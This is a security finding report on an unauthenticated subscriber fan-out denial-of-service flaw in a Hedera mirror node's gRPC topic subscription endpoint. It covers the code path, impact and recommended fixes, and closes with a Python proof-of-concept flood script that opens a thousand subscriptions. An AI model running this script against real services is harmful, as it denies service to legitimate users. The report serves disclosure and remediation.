### Title
Unbounded Subscriber Fan-Out DoS via Unauthenticated gRPC Topic Subscriptions

### Summary
The `subscribeTopic` endpoint in `ConsensusController` accepts unauthenticated connections with no global subscriber limit. Because `RedisTopicListener` uses a single shared Reactor `.share()` flux per topic that fans out to every active subscriber, an attacker opening many connections to a high-traffic topic can exhaust the JVM's `boundedElastic` thread pool and heap memory, degrading or denying service for all legitimate subscribers on that topic.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` (line 43–53) delegates directly to `TopicMessageServiceImpl.subscribeTopic()`, which calls `topicListener.listen(newFilter)` (line 120). No authentication, no per-IP limit, and no global subscriber cap is enforced anywhere in this chain.

`SharedTopicListener.listen()` (lines 21–26) wraps the shared upstream with a **per-subscriber** `onBackpressureBuffer(maxBufferSize, ERROR)` and `publishOn(Schedulers.boundedElastic(), false, prefetch)`:

```java
// SharedTopicListener.java lines 21-26
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    return getSharedListener(filter)
            .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
            .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
            .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
}
```

`RedisTopicListener.getSharedListener()` (lines 59–62) creates exactly one Redis subscription per topic via `computeIfAbsent`, backed by `.share()` (line 79):

```java
// RedisTopicListener.java lines 59-62, 79
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
// subscribe() returns ... .share();
```

**Root cause:** Every call to `listen()` adds a new downstream subscriber to the shared `.share()` flux. On each Redis message, Reactor's `FluxPublish` (the `.share()` implementation) iterates over **all** registered inner subscribers synchronously before returning. Each subscriber also claims a slot in `Schedulers.boundedElastic()` (default cap: `10 × CPU_cores` threads, queue depth 100,000). There is no check anywhere that limits how many subscribers may attach.

**Why existing checks are insufficient:**

- `NettyProperties.maxConcurrentCallsPerConnection = 5` (line 14) limits calls *per TCP connection*, not total. An attacker opens `C` connections → `5C` concurrent subscriptions.
- `subscriberCount` (line 48, `TopicMessageServiceImpl`) is a **metrics gauge only**; it is never compared against a threshold to reject new subscriptions.
- `onBackpressureBuffer(maxBufferSize, ERROR)` terminates *slow* individual subscribers but does not protect against the aggregate resource cost of thousands of *fast* (draining) subscribers.

### Impact Explanation

With `N` attacker-controlled subscribers on one topic:

| Resource | Cost |
|---|---|
| Heap | `N × maxBufferSize × avg_message_size` (default: `N × 16,384 × ~1 KB ≈ 16 GB` at 1,000 subs) |
| Thread pool | `N` tasks competing in `boundedElastic`; pool saturation causes queuing latency for all subscribers |
| CPU | O(N) fan-out per Redis message inside `.share()` dispatch loop |

When the `boundedElastic` queue fills or heap is exhausted, legitimate subscribers experience message delivery delays or OOM-induced crashes. The single Redis subscription is unaffected, but the JVM-side fan-out becomes the bottleneck. Severity: **High** (availability impact on a public infrastructure service).

### Likelihood Explanation

No credentials, API keys, or special network access are required — only a reachable gRPC port. The attack is trivially scriptable: open many TCP connections, each issuing 5 `subscribeTopic` RPCs targeting the same popular topic ID. The `topicExists` check (line 94–105) only requires the topic to exist in the entity table, which is public information on a mirror node. The attack is repeatable and can be sustained indefinitely since subscriptions with no `endTime` never self-terminate.

### Recommendation

1. **Enforce a global subscriber cap** in `TopicMessageServiceImpl.subscribeTopic()`: compare `subscriberCount` against a configurable `maxSubscribers` property and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Enforce a per-IP or per-connection subscriber cap** using a gRPC `ServerInterceptor`.
3. **Add a per-topic subscriber cap** inside `RedisTopicListener.getSharedListener()` before adding to the shared flux.
4. **Require authentication** (even a simple bearer token) for long-lived streaming RPCs to prevent anonymous abuse.
5. Consider reducing `maxBufferSize` default or making it configurable per deployment tier.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_topic_query_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc-host:5600"
TOPIC_ID = 1234  # a known popular topic
NUM_CONNECTIONS = 200
CALLS_PER_CONNECTION = 5  # matches maxConcurrentCallsPerConnection

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_topic_query_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_ID)
    )
    threads = []
    for _ in range(CALLS_PER_CONNECTION):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for w in workers:
    w.start()
# Result: 1,000 concurrent subscribers; boundedElastic thread pool saturated,
# heap pressure from 1,000 × 16,384-slot buffers, O(1000) fan-out per message.
```
